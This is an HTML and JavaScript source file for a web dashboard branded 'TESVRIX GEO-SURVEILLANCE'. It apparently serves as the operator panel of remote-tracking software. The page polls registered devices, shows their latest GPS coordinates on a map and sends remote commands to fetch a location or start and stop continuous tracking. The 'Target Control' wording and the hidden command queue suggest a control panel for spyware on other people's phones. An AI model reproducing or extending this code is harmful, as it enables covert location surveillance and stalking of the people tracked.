<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow">
    <title>TESVRIX · GEO-INTEL | REAL-TIME TRACKING</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-dark: #be123c;
            --primary-glow: rgba(225, 29, 72, 0.5);
            --accent-green: #10b981;
            --accent-cyan: #06b6d4;
            --bg-void: #020617;
            --bg-surface: #0f172a;
            --bg-elevated: #1e293b;
            --glass-border: rgba(225, 29, 72, 0.25);
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --transition-smooth: 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
        }

        body {
            background: radial-gradient(ellipse at 15% 30%, #0a0f1f, var(--bg-void));
            font-family: 'Inter', sans-serif;
            color: var(--text-primary);
            height: 100vh;
            padding: 20px;
            overflow: hidden;
        }

        .app-container { max-width: 1400px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; height: 100%; }

        /* HEADER */
        .command-bar {
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 1rem 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
            box-shadow: 0 10px 40px -10px rgba(0,0,0,0.6);
        }

        .brand-section { display: flex; align-items: center; gap: 15px; }
        .brand-icon { font-size: 1.5rem; color: var(--primary); filter: drop-shadow(0 0 8px var(--primary-glow)); }
        .brand-title h1 { font-family: 'Space Grotesk'; font-size: 1.1rem; font-weight: 800; letter-spacing: 1px; }

        .device-selector {
            background: rgba(2, 6, 23, 0.9);
            border: 1px solid rgba(225, 29, 72, 0.3);
            border-radius: 12px;
            padding: 8px 15px;
            font-family: 'Space Grotesk', monospace;
            font-weight: 600;
            color: var(--text-primary);
            outline: none;
            cursor: pointer;
            min-width: 240px;
            font-size: 0.8rem;
        }

        /* MAIN CONTENT SPLIT */
        .main-layout { display: grid; grid-template-columns: 320px 1fr; gap: 15px; flex: 1; min-height: 0; }

        /* LEFT SIDEBAR */
        .sidebar { display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }

        .card-tesvrix {
            background: rgba(15, 23, 42, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .card-label { font-family: 'JetBrains Mono'; font-size: 0.6rem; font-weight: 700; color: var(--primary); letter-spacing: 2px; text-transform: uppercase; }

        .btn-action {
            width: 100%;
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 12px;
            font-weight: 700;
            font-family: 'Space Grotesk';
            font-size: 0.7rem;
            color: #fff;
            cursor: pointer;
            transition: var(--transition-smooth);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn-action:hover { border-color: var(--primary); background: rgba(30, 41, 59, 1); transform: translateY(-2px); }
        .btn-action.primary { background: var(--primary); border: none; box-shadow: 0 5px 15px var(--primary-glow); }

        .telemetry-item { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 10px 12px; border: 1px solid rgba(255,255,255,0.05); }
        .telemetry-val { font-family: 'JetBrains Mono'; font-size: 0.9rem; font-weight: 700; color: #fff; margin-top: 2px; }
        .telemetry-lbl { font-size: 0.55rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }

        /* MAP AREA */
        .map-container {
            background: rgba(2, 6, 23, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            overflow: hidden;
            position: relative;
        }
        #map { height: 100%; width: 100%; z-index: 1; }

        /* MAP SWITCHER */
        .map-switcher {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 1000;
            background: rgba(2, 6, 23, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            padding: 5px;
            display: flex;
            gap: 5px;
        }
        .map-btn {
            background: transparent;
            border: none;
            color: var(--text-secondary);
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 0.65rem;
            font-weight: 800;
            cursor: pointer;
            transition: 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .map-btn.active { background: var(--primary); color: #fff; }

        /* CUSTOM MARKER */
        .pulse-marker {
            width: 20px; height: 20px;
            background: var(--primary);
            border: 2px solid #fff;
            border-radius: 50%;
            box-shadow: 0 0 15px var(--primary-glow);
            position: relative;
        }
        .pulse-marker::after {
            content: '';
            position: absolute;
            inset: -8px;
            border-radius: 50%;
            border: 2px solid var(--primary);
            animation: pulse-ring 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }
        @keyframes pulse-ring { 0% { transform: scale(0.3); opacity: 0; } 50% { opacity: 0.6; } 100% { transform: scale(1.2); opacity: 0; } }

        @media (max-width: 992px) {
            body { padding: 10px; overflow-y: auto; height: auto; }
            .app-container { height: auto; }
            .main-layout { grid-template-columns: 1fr; }
            .map-container { height: 400px; }
            .command-bar { flex-direction: column; padding: 15px; }
            .device-selector { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="command-bar">
            <div class="brand-section">
                <i class="fas fa-satellite brand-icon"></i>
                <div class="brand-title">
                    <h1>GEO-SURVEILLANCE</h1>
                </div>
            </div>
            <select id="deviceSelector" class="device-selector"></select>
            <button id="btnRefresh" class="btn-action" style="width: auto; padding: 8px 15px; border-radius: 12px;"><i class="fas fa-sync-alt"></i></button>
        </div>

        <div class="main-layout">
            <div class="sidebar">
                <div class="card-tesvrix">
                    <div class="card-label">Target Control</div>
                    <button id="btnRequestUpdate" class="btn-action primary"><i class="fas fa-crosshairs"></i> INSTANT GPS FIX</button>
                    <div style="display: flex; gap: 8px;">
                        <button id="btnStartTracking" class="btn-action" style="color:var(--accent-green);"><i class="fas fa-play"></i> START</button>
                        <button id="btnStopTracking" class="btn-action" style="color:var(--primary);"><i class="fas fa-stop"></i> STOP</button>
                    </div>
                    <div id="cmdStatus" style="font-size: 0.6rem; text-align: center; color: var(--accent-cyan); margin-top: 5px; font-family: 'JetBrains Mono'; display: none; letter-spacing: 1px; text-transform: uppercase;"></div>
                </div>

                <div class="card-tesvrix">
                    <div class="card-label">Node Telemetry</div>
                    <div class="telemetry-item">
                        <div class="telemetry-lbl">Position</div>
                        <div id="valPos" class="telemetry-val">WAITING...</div>
                    </div>
                    <div class="telemetry-item">
                        <div class="telemetry-lbl">Accuracy</div>
                        <div id="valAcc" class="telemetry-val">--</div>
                    </div>
                    <div class="telemetry-item">
                        <div class="telemetry-lbl">Sync Time</div>
                        <div id="valTime" class="telemetry-val">--:--:--</div>
                    </div>
                    <div class="telemetry-item">
                        <div class="telemetry-lbl">Hardware Status</div>
                        <div id="valStatus" class="telemetry-val" style="color:var(--text-secondary);">UNKNOWN</div>
                    </div>
                </div>
            </div>

            <div class="map-container">
                <div id="map"></div>
                <div class="map-switcher">
                    <button class="map-btn active" onclick="changeMap('dark')">Dark</button>
                    <button class="map-btn" onclick="changeMap('satellite')">Satellite</button>
                    <button class="map-btn" onclick="changeMap('streets')">Streets</button>
                </div>
            </div>
        </div>
    </div>

    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    <script>
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let selectedId = null, map, marker, circle;
        let mapLayers = {};

         // Initialize Map
        map = L.map('map', { zoomControl: false }).setView([20, 0], 2);

        mapLayers.dark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        mapLayers.satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}');
        mapLayers.streets = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png');

        function changeMap(type) {
            Object.values(mapLayers).forEach(l => map.removeLayer(l));
            mapLayers[type].addTo(map);
            document.querySelectorAll('.map-btn').forEach(b => b.classList.toggle('active', b.innerText.toLowerCase() === type));
        }

        async function fetchDevices() {
            try {
                const r = await fetch(getApiUrl("devices?operator_id=eq." + auth.operator_id + "&order=last_seen.desc"), { headers: getApiHeaders() });
                const data = await r.json();
                const sel = document.getElementById('deviceSelector');
                sel.innerHTML = data.map(d => {
                    const lastSeen = new Date(d.last_seen).getTime();
                    const isOnline = (Date.now() - lastSeen) < 120000;
                    return `<option value="${d.device_uuid}" ${d.device_uuid === selectedId ? 'selected' : ''}>${isOnline ? '🟢' : '🔴'} ${d.device_name || 'NODE'}</option>`;
                }).join('');
                if (!selectedId && data[0]) { selectedId = data[0].device_uuid; fetchLoc(); }
            } catch (e) {}
        }

        async function fetchLoc() {
            if (!selectedId) return;
            try {
                 // Fetch location coordinates
                const r = await fetch(getApiUrl(`vault?device_uuid=eq.${selectedId}&type=eq.location_update&order=created_at.desc&limit=1`), { headers: getApiHeaders() });
                const data = await r.json();
                if (data && data.length) {
                    let loc = typeof data[0].content === 'string' ? JSON.parse(data[0].content) : data[0].content;
                    updateUI(loc, data[0].created_at);
                }

                 // Fetch hardware ON/OFF status
                const rs = await fetch(getApiUrl(`vault?device_uuid=eq.${selectedId}&type=eq.location_status&order=created_at.desc&limit=1`), { headers: getApiHeaders() });
                const dataStatus = await rs.json();
                if (dataStatus && dataStatus.length) {
                    const status = dataStatus[0].content;
                    const el = document.getElementById('valStatus');
                    el.innerText = status === 'ON' ? 'GPS ENABLED' : 'GPS DISABLED';
                    el.style.color = status === 'ON' ? 'var(--accent-green)' : 'var(--primary)';
                }
            } catch (e) {}
        }

        function updateUI(loc, time) {
            if (!loc.lat || !loc.lng) return;
            document.getElementById('valPos').innerText = `${loc.lat.toFixed(5)}, ${loc.lng.toFixed(5)}`;
            document.getElementById('valAcc').innerText = `${(loc.acc || 0).toFixed(1)} m`;
            document.getElementById('valTime').innerText = new Date(time).toLocaleTimeString();

            const pos = [loc.lat, loc.lng];
            if (!marker) {
                marker = L.marker(pos, { icon: L.divIcon({ className: 'pulse-marker', iconSize: [20, 20], iconAnchor: [10, 10] }) }).addTo(map);
                map.setView(pos, 15);
            } else {
                marker.setLatLng(pos);
                map.panTo(pos);
            }
            if (circle) map.removeLayer(circle);
            circle = L.circle(pos, { radius: loc.acc || 20, color: '#e11d48', fillColor: '#e11d48', fillOpacity: 0.1, weight: 1 }).addTo(map);
        }

        async function sendCmd(type, data = {}) {
            if (!selectedId) return;
            const statusEl = document.getElementById('cmdStatus');
            statusEl.innerText = "TRANSMITTING...";
            statusEl.style.display = 'block';
            statusEl.style.color = 'var(--accent-cyan)';

            try {
                const response = await fetch(getApiUrl("commands"), {
                    method: 'POST',
                    headers: getApiHeaders(),
                    body: JSON.stringify({ device_uuid: selectedId, type, data: JSON.stringify(data), status: 'pending', operator_id: auth.operator_id })
                });

                if (response.ok) {
                    statusEl.innerText = "COMMAND LINK ESTABLISHED";
                    statusEl.style.color = 'var(--accent-green)';
                } else {
                    statusEl.innerText = "UPLINK FAILURE";
                    statusEl.style.color = 'var(--primary)';
                }
            } catch (e) {
                statusEl.innerText = "SIGNAL LOST";
                statusEl.style.color = 'var(--primary)';
            }

            setTimeout(() => { statusEl.style.display = 'none'; }, 3000);
        }

        document.getElementById('btnRequestUpdate').onclick = () => sendCmd('/get_location');
        document.getElementById('btnStartTracking').onclick = () => sendCmd('/start_tracking', { interval: 300000 });
        document.getElementById('btnStopTracking').onclick = () => sendCmd('/stop_tracking');
        document.getElementById('btnRefresh').onclick = fetchLoc;
        document.getElementById('deviceSelector').onchange = (e) => { selectedId = e.target.value; fetchLoc(); };

        fetchDevices();
        setInterval(fetchDevices, 10000);
        setInterval(fetchLoc, 5000);
    </script>
</body>
</html>
